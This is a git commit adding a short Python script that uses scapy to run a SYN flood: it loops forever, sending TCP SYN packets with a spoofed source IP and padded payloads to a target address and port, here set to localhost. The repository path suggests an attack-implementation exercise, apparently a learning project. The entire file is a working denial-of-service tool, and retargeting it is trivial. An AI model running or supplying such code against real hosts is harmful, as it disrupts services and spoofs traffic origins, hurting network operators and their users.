82a377bdfcc132228406fa41891dbd0e5369109b
Adi Levi <adile0194@gmail.com>
2024-07-22 16:40:59 +0300

    added syn flood attack implementation

---
+++ implement_attacks/syn_flood/syn_flood.py
@@ -0,0 +1,19 @@
+from scapy.all import IP, TCP, Raw, send
+import random
+
+target_ip = "127.0.0.1"
+target_port = 8000
+fake_source_ip = "10.0.0.1"  # כתובת ה-IP המזויפת
+
+def syn_flood(target_ip, target_port, fake_source_ip):
+    ip = IP(src=fake_source_ip, dst=target_ip)
+    while True:
+        tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
+        raw = Raw(b"X"*1024)
+        pkt = ip / tcp / raw
+        send(pkt, verbose=0)
+
+try:
+    syn_flood(target_ip, target_port, fake_source_ip)
+except Exception as e:
+    print(f"An error occurred: {e}")
